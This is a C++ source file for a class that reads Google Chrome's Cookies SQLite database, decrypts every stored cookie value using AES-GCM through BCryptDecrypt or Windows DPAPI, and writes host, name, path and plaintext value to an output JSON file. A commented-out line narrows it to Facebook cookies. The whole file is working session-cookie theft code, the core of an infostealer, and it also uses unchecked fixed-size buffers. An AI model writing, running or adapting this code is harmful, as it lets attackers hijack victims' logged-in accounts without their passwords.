#include "ChromeCookies.hpp"

ChromeCookies::ChromeCookies(char* sFilePath) {
	strcpy(this->m_sFilePath, sFilePath);
	this->m_stmt = nullptr;
}

ChromeCookies::~ChromeCookies() {

}

bool ChromeCookies::QuerySqlite() {
	sqlite3* db;
	if (sqlite3_open(this->m_sFilePath, &db) != SQLITE_OK) {
		printf("sqlite3_open");
		return false;
	}
	if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies", -1, &this->m_stmt, 0) != SQLITE_OK) {
		printf("sqlite3_prepare_v2");
		return false;
	}
	return true;
}

bool ChromeCookies::CookiesDecrypt(BCRYPT_KEY_HANDLE hKey) {
	
	while (sqlite3_step(this->m_stmt) == SQLITE_ROW)
	{

		cJSON* root = cJSON_CreateObject();
		CookieData user_data;

		

		char* host_key = (char*)sqlite3_column_text(this->m_stmt, 0);
		/*if (strcmp(host_key, ".facebook.com") != 0) {
			continue;
		}*/
		char* name = (char*)sqlite3_column_text(this->m_stmt, 1);
		char* path = (char*)sqlite3_column_text(this->m_stmt, 2);
		char* encrypted_value = (char*)sqlite3_column_text(this->m_stmt, 3);
		char* expires_utc = (char*)sqlite3_column_text(this->m_stmt, 4);

		cJSON_AddStringToObject(root, "host_key", host_key);
		cJSON_AddStringToObject(root, "name", name);
		cJSON_AddStringToObject(root, "path", path);
		cJSON_AddStringToObject(root, "expires_utc", expires_utc);


		if (host_key == nullptr && name == nullptr && encrypted_value == nullptr)
			break;
		if ((strlen(host_key) == 0) && (strlen(name) == 0) && (strlen(encrypted_value) == 0))
			continue;


		user_data.HostKey = host_key;
		user_data.Name = name;
		user_data.Path = path;
		user_data.ExpireUTC = expires_utc;

		//printf("host key: %s\nname: %s\npath: %s\nexpireUTC: %s\n", host_key, name, path, expires_utc);

		//decryptor.set_password_size(sqlite3_column_bytes(stmt, 3));

		string decrypted_cookie;

		/*if (decryptor.decrypt_data(encrypted_value, decrypted_cookie))
			user_data.Value = decrypted_cookie;*/


		char pbOutput[8196] = { 0 };
		auto password = const_cast<char*>(encrypted_value);
		int passwordSize = sqlite3_column_bytes(this->m_stmt, 3);
		string decryptedCookie = { 0 };
		if (((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '0') ||
			((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '1')) {
			ULONG cbOutput = 1024;
			ULONG cbCiphertext = 0;
			BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO BACMI;
			BCRYPT_INIT_AUTH_MODE_INFO(BACMI);

			BACMI.pbNonce = (PUCHAR)(password + 3);
			BACMI.cbNonce = 12;

			BACMI.pbTag = (PUCHAR)(password + passwordSize - 16);
			BACMI.cbTag = 16;

			NTSTATUS status = 0;
			
			PVOID k = &BACMI;
			if (!BCRYPT_SUCCESS(status = BCryptDecrypt(hKey, (BYTE*)(password + 15), passwordSize - 15 - 16, &BACMI, NULL, 0, (PUCHAR)pbOutput, cbOutput, &cbCiphertext, 0)))
			{
				printf("Error: 0x%x\n", status);
			}

			//pbOutput[cbCiphertext] = '\0';

			cJSON_AddStringToObject(root, "value", pbOutput);

			//printf("value: %s\n", pbOutput);
			//decryptedCookie = pbOutput;
		}
		else {
			char decryptedPass[1024] = { 0 };
			DATA_BLOB in = { 0 };
			DATA_BLOB out = { 0 };


			in.pbData = (BYTE*)password;
			in.cbData = passwordSize;
			int sizeKey = 0;
			if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
			{

				for (int i = 0; i < out.cbData; i++) {
					decryptedPass[i] = out.pbData[i];
					sizeKey++;
				}
				cJSON_AddStringToObject(root, "value", decryptedPass);
				decryptedPass[out.cbData] = '\0';
			}
		}
		char* json_string = cJSON_Print(root);
		printf("%s\n", json_string);

		FILE* file = fopen("output.json", "a+");
		if (file == NULL) {
			printf("Failed to open file.\n");
			return 1;
		}

		fprintf(file, "%s", json_string);

		fclose(file);

		cJSON_Delete(root);
		cJSON_free(json_string);
		//printf("==================================================================================\n");
	}
	return true;
}